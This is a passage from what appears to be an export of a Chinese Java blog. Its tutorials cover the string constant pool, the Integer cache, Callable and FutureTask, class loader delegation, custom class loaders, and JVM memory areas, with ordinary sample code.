\"ing\";String str4 = str1 + str2;String str5 = \"string\";System.out.println(str3 == str4);//falseSystem.out.println(str3 == str5);//true 前面已经提到了，在编译阶段，String str3 = &quot;str&quot; + &quot;ing&quot;; 的写法会直接被优化为 String str3 = &quot;string&quot;; 。 因此 str3 和 str5 没有区别。 但存在一些特例： 特例11234567public static final String A = \"ab\"; // 常量Apublic static final String B = \"cd\"; // 常量Bpublic static void main(String[] args) &#123; String s = A + B; // 将两个常量用+连接对s进行初始化 String t = \"abcd\"; System.out.println(s == t);//true&#125; A 和 B 都是常量，值是固定的，因此的值也是固定的，它在类被编译时就已经确定了。也就是说：String s = A + B; 等价于 String s = &quot;ab&quot; + &quot;cd&quot; 。 特例2123456789101112public static final String A; // 常量Apublic static final String B; // 常量Bstatic &#123; A = \"ab\"; B = \"cd\"; &#125; public static void main(String[] args) &#123; // 将两个常量用+连接对s进行初始化 String s = A + B; String t = \"abcd\"; System.out.println(s == t);//false &#125; A 和 B 虽然被定义为常量，但是它们都没有在编译阶段被赋值。在运算出 s 的值之前，他们何时被赋值，以及被赋予什么样的值，都是个变数。 因此 A 和 B 在被赋值之前，性质类似于一个变量。那么 s 就不能在编译期被确定，而只能在运行时被创建了。 8种基本类型的包装类和常量池Java 基本类型的包装类的大部分都实现了常量池技术，即 Byte、Short、Integer、Long、Character、Boolean；这 5 种包装类默认创建了数值为整数且范围为 [-128，127] 的相应类型的缓存数据，但是超出此范围仍然会创建新的对象。 两种浮点数类型的包装类 Float、Double 并没有实现常量池技术。 例子1123456789Integer i1 = 33;Integer i2 = 33;System.out.println(i1 == i2);// 输出trueInteger i11 = 333;Integer i22 = 333;System.out.println(i11 == i22);// 输出falseDouble i3 = 1.2;Double i4 = 1.2;System.out.println(i3 == i4);// 输出false Integer 缓存源代码： 12345678/** *此方法将始终缓存-128到127（包括端点）范围内的值，并可以缓存此范围之外的其他值。 */public static Integer valueOf(int i) &#123; if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i);&#125; 应用场景： Integer i1=40; ：Java 在编译的时候会直接将代码封装成 Integer i1=Integer.valueOf(40); 从而使用常量池中的对象。 Integer i1 = new Integer(40);：这种情况下会创建新的对象。 123Integer i1 = 40;Integer i2 = new Integer(40);System.out.println(i1==i2); //输出false 例子2Integer 比较（==）更丰富的一个例子： 12345678910111213Integer i1 = 40;Integer i2 = 40;Integer i3 = 0;Integer i4 = new Integer(40);Integer i5 = new Integer(40);Integer i6 = new Integer(0); System.out.println(\"i1=i2 \" + (i1 == i2)); //trueSystem.out.println(\"i1=i2+i3 \" + (i1 == i2 + i3)); //trueSystem.out.println(\"i1=i4 \" + (i1 == i4)); //falseSystem.out.println(\"i4=i5 \" + (i4 == i5)); //falseSystem.out.println(\"i4=i5+i6 \" + (i4 == i5 + i6)); //trueSystem.out.println(\"40=i5+i6 \" + (40 == i5 + i6)); //true 解释对于语句 i4 == i5 + i6，由于 + 这个操作符不适用于 Integer 对象。 因此，首先 i5 和 i6 进行自动拆箱操作，进行数值相加。 然后，由于 Integer 对象无法与数值进行直接比较，所以将 i4 自动拆箱转为int 值 40。 最终这条语句转为40 == 40进行数值比较。 Reference 《Thinking in Java》 JVM基础面试题及原理讲解 - http://www.importnew.com/31126.html String：字符串常量池 - https://segmentfault.com/a/1190000009888357 Java中几种常量池的区分 - http://tangxman.github.io/2015/07/27/the-difference-of-java-string-pool/ java用这样的方式生成字符串：String str = “Hello”，到底有没有在堆中创建对象？ - https://www.zhihu.com/question/29884421 可能是把Java内存区域讲的最清楚的一篇文章 - https://juejin.im/post/5b7d69e4e51d4538ca5730cb#heading-17 深入解析String#intern - https://tech.meituan.com/2014/03/06/in-depth-understanding-string-intern.htmls Java中的字符串常量池 - https://droidyue.com/blog/2014/12/21/string-literal-pool-in-java/ Java常量池理解与总结 - https://www.jianshu.com/p/c7f47de2ee80 常量池之字符串常量池String.intern() - https://cloud.tencent.com/developer/article/1129475 为什么String类是不可变的？ - http://www.importnew.com/7440.html 我终于搞清楚了和String有关的那点事儿。 - https://www.hollischuang.com/archives/2517 好好说说Java中的常量池之Class常量池 - https://juejin.im/post/5bd7c0f8e51d457abd7430c6","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】多线程-Callable、Future 和 FutureTask","date":"2019-03-08T08:14:02.000Z","path":"2019/03/08/【Java】多线程-Callable、Future-和-FutureTask/","text":"背景我们知道，创建线程类有 2 种方式，一种是直接继承 Thread，另外一种就是实现 Runnable 接口。 这 2 种方式都有一个缺陷就是：在执行完任务之后无法获取执行结果。 如果需要获取执行结果，就必须通过共享变量或者使用线程通信的方式来达到效果，这样使用起来就比较麻烦。 而自从 Java 1.5 开始，就提供了 Callable 和 Future，通过它们可以在任务执行完毕之后得到任务执行结果。 今天我们就来讨论一下 Callable、Future 和 FutureTask 三个类的使用方法。 Callable 与 Runnable 接口先说一下 java.lang.Runnable 吧，它是一个接口，在它里面只声明了一个run()方法： 123public interface Runnable &#123; public abstract void run();&#125; 由于 run() 方法返回值为 void 类型，所以在执行完任务之后无法返回任何结果。 Callable 位于 java.util.concurrent 包下，它也是一个接口，在它里面也只声明了一个方法，只不过这个方法叫做 call() ： 123456789public interface Callable&lt;V&gt; &#123; /** * Computes a result, or throws an exception if unable to do so. * * @return computed result * @throws Exception if unable to compute a result */ V call() throws Exception;&#125; 可以看到，这是一个泛型接口，call() 函数返回的类型就是传递进来的V类型。 那么怎么使用 Callable 呢？一般情况下是配合ExecutorService来使用的，在 ExecutorService 接口中声明了若干个submit方法的重载版本： 123&lt;T&gt; Future&lt;T&gt; submit(Callable&lt;T&gt; task);&lt;T&gt; Future&lt;T&gt; submit(Runnable task, T result);Future&lt;?&gt; submit(Runnable task); 第一个 submit 方法里面的参数类型就是 Callable。 一般情况下我们使用第一个 submit 方法和第三个 submit 方法，第二个 submit 方法很少使用。 Future 接口Future 就是对于具体的 Runnable 或者 Callable 任务的执行结果接口，因此可以通过它进行取消、查询是否完成、获取结果。 必要时可以通过 get 方法获取执行结果，该方法会阻塞直到任务返回结果。 Future 位于 java.util.concurrent 包下，它是一个接口： 12345678public interface Future&lt;V&gt; &#123; boolean cancel(boolean mayInterruptIfRunning); boolean isCancelled(); boolean isDone(); V get() throws InterruptedException, ExecutionException; V get(long timeout, TimeUnit unit) throws InterruptedException, ExecutionException, TimeoutException;&#125; 在Future接口中声明了5个方法，下面依次解释每个方法的作用： cancel()用来取消任务，如果取消任务成功则返回 true，如果取消任务失败则返回 false。 参数 mayInterruptIfRunning 表示是否允许取消正在执行却没有执行完毕的任务： 如果设置 true，则表示可以取消正在执行过程中的任务。 如果任务已经完成，则无论 mayInterruptIfRunning 为 true 还是 false，此方法肯定返回 false，即如果取消已经完成的任务会返回 false； 如果任务正在执行，若 mayInterruptIfRunning 设置为 true，则返回true，若 mayInterruptIfRunning 设置为 false，则返回false；如果任务还没有执行，则无论mayInterruptIfRunning为true还是false，肯定返回true。 isCancelled()表示任务是否被取消成功，如果在任务正常完成前被取消成功，则返回 true。 isDone()表示任务是否已经完成，若任务完成，则返回 true。 get()用来获取执行结果，这个方法会产生阻塞，会一直等到任务执行完毕才返回； get(long timeout, TimeUnit unit)用来获取执行结果，如果在指定时间内，还没获取到结果，就直接返回null。 也就是说Future提供了三种功能： 判断任务是否完成； 能够中断任务； 能够获取任务执行结果。 因为 Future 只是一个接口，所以是无法直接用来创建对象使用的，因此就有了下面的 FutureTask。 FutureTask我们先来看一下FutureTask的实现： 1public class FutureTask&lt;V&gt; implements RunnableFuture&lt;V&gt; FutureTask类实现了RunnableFuture接口，我们看一下RunnableFuture接口的实现： 123public interface RunnableFuture&lt;V&gt; extends Runnable, Future&lt;V&gt; &#123; void run();&#125; 可以看出 RunnableFuture 继承了 Runnable 接口和 Future 接口，而 FutureTask 实现了 RunnableFuture 接口。所以它既可以作为 Runnable 被线程执行，又可以作为 Future 得到 Callable 的返回值。 FutureTask 提供了 2 个构造器： 1234public FutureTask(Callable&lt;V&gt; callable) &#123;&#125;public FutureTask(Runnable runnable, V result) &#123;&#125; 事实上，FutureTask是Future接口的一个唯一实现类。 使用示例1.使用 Callable+Future 获取执行结果12345678910111213141516171819202122232425262728293031323334353637public class Test &#123; public static void main(String[] args) &#123; ExecutorService executor = Executors.newCachedThreadPool(); Task task = new Task(); Future&lt;Integer&gt; result = executor.submit(task); executor.shutdown(); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e1) &#123; e1.printStackTrace(); &#125; System.out.println(\"主线程在执行任务\"); try &#123; System.out.println(\"task运行结果\"+result.get()); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; catch (ExecutionException e) &#123; e.printStackTrace(); &#125; System.out.println(\"所有任务执行完毕\"); &#125;&#125;class Task implements Callable&lt;Integer&gt;&#123; @Override public Integer call() throws Exception &#123; System.out.println(\"子线程在进行计算\"); Thread.sleep(3000); int sum = 0; for(int i=0;i&lt;100;i++) sum += i; return sum; &#125;&#125; 执行结果1234子线程在进行计算主线程在执行任务task运行结果4950所有任务执行完毕 2.使用 Callable+FutureTask 获取执行结果1234567891011121314151617181920212223242526272829303132333435363738public class Test &#123; public static void main(String[] args) &#123; ExecutorService executor = Executors.newCachedThreadPool(); Task task = new Task(); FutureTask&lt;Integer&gt; futureTask = new FutureTask&lt;Integer&gt;(task); executor.submit(futureTask); executor.shutdown(); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e1) &#123; e1.printStackTrace(); &#125; System.out.println(\"主线程在执行任务\"); try &#123; System.out.println(\"task运行结果\"+futureTask.get()); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; catch (ExecutionException e) &#123; e.printStackTrace(); &#125; System.out.println(\"所有任务执行完毕\"); &#125;&#125;class Task implements Callable&lt;Integer&gt;&#123; @Override public Integer call() throws Exception &#123; System.out.println(\"子线程在进行计算\"); Thread.sleep(3000); int sum = 0; for(int i=0;i&lt;100;i++) sum += i; return sum; &#125;&#125; Reference Java并发编程：Callable、Future和FutureTask - https://www.cnblogs.com/dolphin0520/p/3949310.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】JVM-双亲委派模型（Parents Delegation model）","date":"2019-03-07T05:02:48.000Z","path":"2019/03/07/【Java】类加载-双亲委派模型/","text":"双亲委派模型（Parents Delegation model）双亲委派模型（Parents Delegation model）要求：除了顶层的启动类加载器（BootStrap ClassLoader）外，其余的类加载器都应当有自己的父类加载器。 注意，这里类加载器之间的父子关系不是以继承（inheritance）的关系来实现的，而是当加载一个 Class 类时，不同的类加载器在执行这个加载任务时，拥有不同的优先级（priority），其中父类加载器的优先级更高，因而父类加载器总是优先执行加载任务。 另外，值得一提的是，双亲委派的原文是 “parents delegate”。parents 常翻译为“父母”，但其实也有表达“上溯，母体，祖先”的意思。因此，在双亲委派模型（Parents Delegation model）中， “parents delegate” 是指子类加载器总是先委派任务给自己的父类加载器（去执行类加载任务），而不是自己直接执行。因此，不是指子类加载器有两个父类加载器。 类加载器（Class Loader）在 Java 中，默认提供的三种类加载器，分别是 BootStrapClassLoader（启动类加载器）、ExtClassLoader（扩展类加载器）、AppClassLoader（应用程序类加载器）。 BootStrapClassLoader（启动类加载器）：它由 C++ 实现，在 Java 程序中不能显式地获取到。它负责加载存储在 %JAVA_HOME%/jre/lib 、%JAVA_HOME%/jre/classes 以及 -Xbootclasspath 参数指定的路径中的类。 ExtClassLoader（扩展类加载器）：它是由sun.misc.Launcher$ExtClassLoader 实现，负责加载 %JAVA_HOME%/jre/lib/ext 路径以及java.ext.dirs 系统变量指定的路径中的类库。 AppClassLoader（应用程序类加载器）：由sun.misc.Launcher$AppClassLoader 来实现，它负责加载用户类路径（classpath）中的指定类，我们可以直接使用这个类加载器。一般情况，如果我们没有自定义类加载器（CustomClassLoader）默认就是用这个加载器。 同时，我们也可以定义自己的类加载器 （Custom ClassLoader），那么它的 parent 肯定就是 AppClassLoader（应用程序类加载器）了。类加载器的这种层次关系称为双亲委派模型（Parents Delegation Model）。 如果站在 JVM 的角度来看，只存在两种类加载器： 启动类加载器（Bootstrap ClassLoader）：由 C++ 实现，它负责加载存储在 %JAVA_HOME%/jre/lib 、%JAVA_HOME%/jre/classes 以及 -Xbootclasspath 参数指定的路径中的类。 其他类加载器：由 Java 实现，继承自抽象类 ClassLoader ，具体包括： 扩展类加载器（Extension ClassLoader）：负责加载 %JAVA_HOME%/jre/lib/ext 路径以及java.ext.dirs 系统变量指定的路径中的类库。 应用程序类加载器（Application ClassLoader）：负责加载用户类路径（classpath）中的指定类，我们可以直接使用这个类加载器。一般情况，如果我们没有自定义类加载器（CustomClassLoader）默认就是用这个加载器。 开发者定义的类加载器 （CustomClassLoader） 双亲委派模型的工作过程 当前类加载器首先从自己已经加载的类（缓存）中，查询是否此类已经加载，如果已经加载，则直接返回原来已经加载的类。 如果在当前类加载器的缓存中，没有找到期待被加载的类时，则委托父类加载器去加载。父类加载器采用同样的策略，首先查看自己的缓存，（如果仍然没有）则继续委托其父类加载去加载，一直到 BootStrapClassLoader（启动类加载器）。 当所有的父类加载器都没有加载此类时，才由当前的类加载器加载，并将其放入自己的缓存中，以便下次有加载请求时直接返回。 ClassLoader 的源码： 1234567891011121314151617181920212223242526272829303132333435protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; synchronized (getClassLoadingLock(name)) &#123; // First, check if the class has already been loaded Class&lt;?&gt; c = findLoadedClass(name); if (c == null) &#123; long t0 = System.nanoTime(); try &#123; if (parent != null) &#123; c = parent.loadClass(name, false); &#125; else &#123; c = findBootstrapClassOrNull(name); &#125; &#125; catch (ClassNotFoundException e) &#123; // ClassNotFoundException thrown if class not found // from the non-null parent class loader &#125; if (c == null) &#123; // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); &#125; &#125; if (resolve) &#123; resolveClass(c); &#125; return c; &#125;&#125; 分析即当前类加载器先检查，该类是否已经被加载过。若没有，则调用父类加载器的 loadClass() 方法，依次向上递归。 若父类加载器为空，则说明递归到启动类加载器了。如果从父类加载器到启动类加载器的上层次的所有加载器都加载失败，则调用自己的 findClass() 方法进行加载。 双亲委派模式优势避免类的重复加载采用双亲委派模式的好处是，Java 类随着它的类加载器一起，具备了一种带有优先级的层次关系，通过这种层级关可以避免类的重复加载。 当父亲已经加载了该类时，就没有必要子类加载器再加载一次。 安全因素其次是考虑到安全因素，Java 核心 API 中定义类不能被修改。 假设通过网络传递一个名为 java.lang.Integer 的类，通过双亲委托模式传递到启动类加载器，而启动类加载器在核心 Java API 发现这个名字的类，发现该类已被加载，并不会重新加载网络传递的过来的 java.lang.Integer，而直接返回已加载过的 Integer.class，这样便可以防止核心 API 库被随意篡改。 可能你会想，如果我们在自定义一个类加载器，并且通过我们自己定义的类加载器来加载我们的 java.lang.Integer 类会怎么样呢？ 在这种情况下，看起来我们定义的 java.lang.Integer 类会被加载到 JVM 中，而事实上，这样的做法会触发 JVM 的保护机制，因为我们定义的类所在的包（java.lang.Integer）已经被核心 Java API 使用而且进行保护。 最终运行程序会提示 Exception in thread “main” java.lang.SecurityException: Prohibited package name: java.lang.lang。 破坏双亲委派模型背景双亲委托模型并不是一个强制性的约束，而是 Java 设计者推荐给开发者的类加载器实现方式。 在 Java 的世界中大部分的类加载器都遵循这个模型，但也有例外，到目前为止，双亲委派模型主要出现过3个较大规模的“被破坏”的情况。 为什么需要破坏双亲委派？而且，在某些情况下，由于受到加载范围的限制，父类加载器无法加载到需要的文件，因而父类加载器需要委托子类加载器去加载类文件。 以 Driver 接口为例，由于 Driver 接口定义在 JDK 当中的，而其实现由各个数据库的服务商来提供，比如 MySQL 就写了 MySQL Connector。 那么问题就来了，DriverManager（也由 JDK提供）要加载各个实现了 Driver 接口的实现类。而 DriverManager 由启动类加载器（Bootstrap ClassLoader）进行加载，而其具体实现是由服务商提供的，由应用程序类加载器（Application ClassLoader）加载。 这个时候就需要启动类加载器来委托子类来加载 Driver 的各种实现类，从而破坏了双亲委派，这里仅仅是举了破坏双亲委派的其中一个情况。 总结双亲委派模型的实现依赖于loadClass方法，因此 如果不想不破坏双亲委派模型，只要去重写 findClass 方法 如果想要去破坏双亲委派模型，需要去重写 loadClass 方法 细节可参考 https://blog.csdn.net/Ditto_zhou/article/details/79972240 。 Reference 《深入理解Java虚拟机》 深入理解Java类加载器(ClassLoader) - https://blog.csdn.net/javazejian/article/details/73413292 JVM 类加载机制深入浅出 - https://www.jianshu.com/p/3cab74a189de 深入理解JVM类加载机制 - https://juejin.im/post/5a1d5f286fb9a045132a7100 Java虚拟机 —— 类的加载机制 - https://juejin.im/post/59c4dd9e5188257e876a1aee Java 中的双亲委派的“双”怎么理解 ？ - https://www.zhihu.com/question/288949359 双亲委派模型与自定义类加载器 - https://blog.csdn.net/huachao1001/article/details/52297075 【JVM】浅谈双亲委派和破坏双亲委派 - https://www.cnblogs.com/joemsu/p/9310226.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】JVM-自定义类加载器","date":"2019-03-07T05:01:51.000Z","path":"2019/03/07/【Java】类加载-自定义类加载器/","text":"自定义类加载器中的方法findClass()findClass() 方法是自定义类加载器类必须重写（override）的方法，用于告诉自定义类加载器到哪里去加载类，比如某个目录或者 JAR URL等。参数name 为要加载的类全名，如 java.lang.String。 该方法作为类加载的步骤之一被loadClass()方法调用。 123protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; throw new ClassNotFoundException(name);&#125; loadClass()123public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123; return loadClass(name, false);&#125; getParent()用于获取class loader的parent，没有返回null。 1public final ClassLoader getParent() findLoadedClass方法返回已经加载的类。该方法直接调用本地方法实现。 1protected final Class&lt;?&gt; findLoadedClass(String name) 自定义类加载器的例子创建自定义类加载类我们重写了父类的 findClass() 方法。 12345678910111213141516171819202122232425262728package com.concretepage.lang;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class CustomClassLoaderDemo extends ClassLoader &#123; @Override public Class&lt;?&gt; findClass(String name) &#123; byte[] bt = loadClassData(name); return defineClass(name, bt, 0, bt.length); &#125; private byte[] loadClassData(String className) &#123; //read class InputStream is = getClass().getClassLoader().getResourceAsStream(className.replace(\".\", \"/\")+\".class\"); ByteArrayOutputStream byteSt = new ByteArrayOutputStream(); //write into byte int len =0; try &#123; while((len=is.read())!=-1)&#123; byteSt.write(len); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; //convert into byte array return byteSt.toByteArray(); &#125; &#125; 创建一个进行加载测试的类123456package com.concretepage.lang;public class Test &#123; public void show()&#123; System.out.println(\"Hello World!\"); &#125;&#125; 创建主函数以测试自定义加载类我们实例化一个 Test 对象，并调用其 show() 方法。 1234567891011121314package com.concretepage.lang;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class MainClass &#123; public static void main(String[] args) throws InstantiationException, IllegalAccessException, NoSuchMethodException, SecurityException, IllegalArgumentException, InvocationTargetException &#123; CustomClassLoaderDemo loader = new CustomClassLoaderDemo(); Class&lt;?&gt; c = loader.findClass(\"com.concretepage.lang.Test\"); Object ob = c.newInstance(); Method md = c.getMethod(\"show\"); md.invoke(ob); &#125;&#125; 输出1Hello World! Reference Custom ClassLoader Java Example - https://www.concretepage.com/java/custom-classloader-java-example","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】JVM - 对象访问","date":"2019-03-06T05:13:29.000Z","path":"2019/03/06/【Java】JVM-对象访问/","text":"对象访问我们来探讨一个问题：在Java语言中，对象访问是如何进行的？ 对象访问在Java语言中无处不在，是最普通的程序行为，但即使是最简单的访问，也会却涉及Java栈、Java堆、方法区这三个最主要内存区域之间的关联关系，如下面的这句代码： 1Object obj = new Object(); 假设这句代码出现在方法体中，那“Object obj”这部分的语义将会反映到Java栈的本地变量表中，作为一个reference类型数据出现。 而“new Object〇”这部分的语义将会反映到Java堆中，形成一块存储了 Object类型所有实例数据值（Instance Data，对象中各个实例字段的数据）的结构化内存，根据具体类型以及虚拟机实现的对象内存布局 (Object Memory Layout）的不同，这块内存的长度进不固定的。 另外，在Java堆中还必须包含能査找到此对象类型数据（如对象类型、父类、实现的接口、方法等）的地址信息，这些类型数据则存储在方法区中。 由于reference类型在Java虚拟机规范里面只规定了一个指向对象的引用，并没有定义这个引用应该通过哪种方式去定位，以及访问到Java堆中的对象的具体位置，因此 不同 Java 虚拟机实现的对象访问方式会有所不同，主流的访问方式有两种：使用句柄和直接指针。 如果使用句柄访问方式，Java 堆中将会划分出一块内存来作为句柄池，reference 中存储的就是对象的句柄地址，而句柄中包含了对象实例数据和类型数据各自的具体地址信息。 如果使用直接指针访问方式，Java 堆对象的布局中就必须考虑如果防止访问类型是数据的相关信息，reference 中直接存储的就是对象地址。 二者对比这两种对象的访问方式各有优势。 使用句柄来访问的最大好处就是reference中存储的是稳定句柄地址， 在对象被移动（垃圾收集时移动对象是非常普遍的行为）时只会改变句柄中的实例数据指针， 而reference本身不需要被修改。 使用直接指针来访问最大的好处就是速度更快， 它节省了一次指针定位的时间开销， 由于对象访问的在Java中非常频繁， 因此这类开销积小成多也是一项非常可观的执行成本。","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】JVM - JVM 内存区域","date":"2019-03-06T04:12:17.000Z","path":"2019/03/06/【Java】JVM-JVM内存区域/","text":"JVM 内存区域JVM 内存区域 主要由运行时数据区域（Runtime data area）、类加载器子系统（Class Loader Subsystem）和执行引擎（Execution Engine）组成。 JVM 内存区域有时也被称为 JVM 内存结构或 JVM 架构（architecture）。在本文中，我们遵循在《深入理解Java虚拟机：JVM高级特性与最佳实践》中的描述，称为 JVM 内存区域。 1 运行时数据区（Runtime Data Area）Java 虚拟机在执行 Java 程序的过程中会把它管理的内存划分成若干个不同的运行时数据区域（Runtime data area）。 运行时数据区域（Runtime data area）包括： Java堆（Java Heap） 方法区（Method Area） Java栈（Java Stack） 本地方法栈（Native Method Stack） 程序计数器（PC Counters） Java 堆（Java Heap）Java 堆（Heap）用于存储动态或临时分配的内存空间。类和数组是在这块区域里创建的。此内存区域的唯一目的就是存放对象实例，几乎所有的对象实例以及数组都在这里分配内存。Java 堆被是所有线程共享。 Java 堆是垃圾收集器管理的主要区域，因此也被称作GC堆（Garbage Collected Heap）。 从垃圾回收的角度，由于现在收集器基本都采用分代垃圾收集算法（generational garbage collection algorithm），所以 Java 堆还可以细分为：新生代和老年代：再细致一点有：Eden空间、From Survivor、To Survivor空间等。进一步划分的目的是更好地回收内存，或者更快地分配内存。 方法区（Method Area）方法区与 Java 堆一样，是各个线程共享的内存区域，它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。 虽然Java虚拟机规范把方法区描述为堆的一个逻辑部分，但是它却有一个别名叫做 Non-Heap（非堆），目的应该是与 Java 堆区分开来。 对这块区域进行垃圾回收的主要目标是对常量池的回收和对类的卸载，但是一般比较难实现。 从 JDK 1.8 开始，移除永久代，并把方法区移至元空间，它位于本地内存中，而不是虚拟机内存中。 方法区是一个 JVM 规范，永久代与元空间都是其一种实现方式。在 JDK 1.8 之后，原来永久代的数据被分到了堆和元空间中。元空间存储类的元信息，静态变量和常量池等放入堆中。 运行时常量池（Runtime constant pool）运行时常量池（Runtime constant pool）是 Java 堆（Heap）的一部分。 Class 文件中除了有类的版本、字段、方法、接口等描述信息外，还有常量池信息（用于存放编译期生成的各种字面量和符号引用） 既然运行时常量池是堆的一部分，自然受到方法区内存的限制，当常量池无法再申请到内存时会抛出 OutOfMemoryError 异常。 注意，运行时常量池是原本是方法区的一部分，JDK1.7及之后版本的 JVM 已经将运行时常量池从方法区中移了出来，在 Java 堆（Heap）中开辟了一块区域存放运行时常量池。 Java 虚拟机栈（JVM Stacks）Java 虚拟机栈（JVM Stacks）由一个个栈帧（Stack Frame）组成，每个方法被执行时都会创建一个栈帧，而每个栈帧（Stack Frame）中都拥有局部变量表、操作数栈、动态链接、方法出口信息。每一个方法被调用直至执行完成的过程，就对应着一个栈帧在虚拟机栈中从入栈到出栈的过程。 局部变量表主要存放了编译器可知的各种数据类型（boolean、byte、char、short、int、float、long、double）、对象引用（reference类型，它不同于对象本身，可能是一个指向对象起始地址的引用指针，也可能是指向一个代表对象的句柄或其他与此对象相关的位置）。 Java 虚拟机栈（JVM Stack）是线程私有的，即每个线程都拥有一个自己的Java 虚拟机栈（JVM Stack）。 本地方法栈（Native Method Stacks）本地方法栈（Native Method Stacks）和虚拟机栈所发挥的作用非常相似，区别是：虚拟机栈为虚拟机执行 Java 方法 （也就是字节码）服务的，而本地方法栈则为虚拟机使用到的 Native 方法服务。 本地方法被执行的时候，在本地方法栈也会创建一个栈帧（stack frame），用于存放该本地方法的局部变量表、操作数栈、动态链接、出口信息。 程序计数器（PC Counters）程序计数器（PC Counters）是一块较小的内存空间，可以看作是当前线程所执行的字节码的行号指示器。 字节码解释器工作时通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等功能都需要依赖这个计数器来完。 另外，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个独立的程序计数器，各线程之间计数器互不影响，独立存储，我们称这类内存区域为“线程私有”的内存。 2 类加载器子系统（Class Loader Subsystem）类加载器子系统（Class Loader Subsystem）负责加载程序中的类和接口，并赋予唯一的名字予以标识。 在 Java 中，默认提供的三种类加载器，分别是BootStrapClassLoader（启动类加载器）、ExtClassLoader（扩展类加载器）、AppClassLoader（应用程序类加载器）。 BootStrapClassLoader（启动类加载器）：它由 C++ 实现的，在Java程序中不能显式地获取到。它负责加载存放在 %JAVA_HOME%/jre/lib 、%JAVA_HOME%/jre/classes 以及-Xbootclasspath参数指定的路径中的类。 ExtClassLoader（扩展类加载器）：它是由sun.misc.Launcher$ExtClassLoader实现，负责加载 %JAVA_HOME%/jre/lib/ext、路径下的所有classes目录以及java.ext.dirs 系统变量指定的路径中类库。 AppClassLoader（应用程序类加载器）：由sun.misc.Launcher$AppClassLoader来实现，它负责加载用户类路径（ClassPath）中的类，开发者可以直接使用该类加载器。一般来说，开发者自定义的类就是由应用程序类加载器加载的。 类加载过程 加载（Loading）：通过一个类的类全局限定名（Fully Qualified Class Name）查找此类字节码文件，并利用字节码文件（.class文件），将这个字节流所代表的静态存储结构转化为方法区（method area）的运行时（runtime）数据结构。 链接（Linking）：链接是检验类或接口并准备类型和父类接口的过程。链接过程包含三步：校验（Verifying）、准备（Preparing）、解析（Resolutions）。 验证（verification）：目的在于确保Class文件的字节流中包含信息符合当前虚拟机要求，不会危害虚拟机自身安全。 准备（Preparation）：分配一个结构用来存储类信息，这个结构中包含了类中定义的成员变量，方法 和接口信息等。 为类变量（即在类中由static修饰的字段变量）分配内存并且设置该类变量的初始值即0（如 static int i=5; 这里只将 i 初始化为 0，至于 5 的值将在初始化阶段时赋值）。 注意，这里不会为实例变量初始化。因为类变量会分配在方法区中，而实例变量是会随着对象一起分配到 Java 堆中。 解析（Resolutions）：主要将类的常量池中的符号引用（Symbolic References）替换为直接引用（Direct References）。 符号引用（Symbolic References）是一组符号来描述目标，可以是任何字面量； 而直接引用（Direct References）就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。 初始化（Initialization）：类加载最后阶段，执行静态初始化程序，类把静态变量初始化成指定的值。 若该类具有超类，则对其进行初始化，执行静态初始化器和为类变量真正赋值（在准备阶段，只为类的 static 变量赋了系统默认值，而在初始化阶段将会为类变量真正赋值），成员变量也将被初始化。 3 执行引擎（Execution Engine）通过类加载器加载，被分配到 JVM 的运行时数据区（Runtime data area）的字节码会被执行引擎（Execution Engine）执行。 执行引擎以指令为单位读取 Java 字节码。它就像一个 CPU 一样，一条一条地执行机器指令。每个字节码指令都由一个1字节的操作码和附加的操作数组成。执行引擎 取得一个操作码，然后根据操作数来执行任务，完成后就继续执行下一条操作码。 不过 Java 字节码是用一种人类可以读懂的语言编写的，而不是用机器可以直接执行的语言。因此，执行引擎必须把字节码转换成可以直接被 JVM 执行的语言。 字节码可以通过以下两种方式转换成机器语言： 解释器（Interpreter） 解释器 一条一条地读取字节码，解释并且执行 字节码指令。因为它一条一条地解释和执行指令，所以它可以很快地解释字节码，但是执行起来会比较慢。这是解释执行的语言的一个缺点。字节码这种“语言”基本来说是解释执行的。 即时（Just-In-Time）编译器 即时（Just-In-Time）编译器被引入用来弥补解释器的缺点。执行引擎 首先按照 解释执行 的方式来执行，然后在合适的时候，即时编译器 把 整段字节码 编译成 本地代码。然后，执行引擎就没有必要再去解释执行方法了，它可以直接通过本地代码去执行它。执行本地代码比一条一条进行解释执行的速度快很多。编译后的代码可以执行的很快，因为本地代码是保存在缓存里的。 Java 字节码是解释执行的，但是没有直接在 JVM 宿主执行原生代码快。为了提高性能，Oracle 